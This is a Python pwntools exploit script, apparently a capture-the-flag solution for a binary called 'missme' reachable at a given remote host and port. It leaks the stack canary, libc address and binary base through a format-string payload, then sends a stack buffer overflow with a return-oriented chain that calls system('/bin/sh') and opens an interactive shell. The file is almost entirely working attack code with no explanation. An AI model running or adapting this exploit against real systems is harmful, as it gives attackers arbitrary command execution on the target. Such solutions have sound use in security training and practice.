#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./missme"
HOST = "185.14.184.242"
PORT = 15990

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
	libc = ELF('./libc.so.6')
	off_start_main = 0x2409b
else:
	conn = process(FILE_NAME)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
	off_start_main = 0x270b3

elf = ELF(FILE_NAME)
off_main = elf.symbols["main"]

off_rdi_ret = 0x13db
off_only_ret = 0x1016
#
#libc = ELF('./')
off_binsh = next(libc.search(b"/bin/sh"))
off_system = libc.symbols["system"]

def exploit():
	buflen = 0x810
	conn.recv()
	payload = "AA"
	payload += "%267$p,%269$p,%273$p,"
	conn.sendline(payload)
	conn.recvuntil("AA")
	
	canary =  int(conn.recvuntil(",")[:-1],16)
	libc_base =  int(conn.recvuntil(",")[:-1],16) - off_start_main
	bin_base = int(conn.recvuntil(",")[:-1],16) - off_main
	print(hex(canary))
	print(hex(libc_base))
	print(hex(bin_base))
	
	rdi_ret = bin_base + off_rdi_ret
	only_ret = bin_base + off_only_ret

	libc_system = libc_base + off_system	
	libc_binsh = libc_base + off_binsh
	
	payload = b"A"*(buflen - 8)
	payload += p64(canary)
	payload += p64(0)
	payload += p64(only_ret)
	payload += p64(rdi_ret)
	payload += p64(libc_binsh)
	payload += p64(libc_system)

	conn.sendline(payload)
	conn.interactive()

if __name__ == "__main__":
	exploit()	
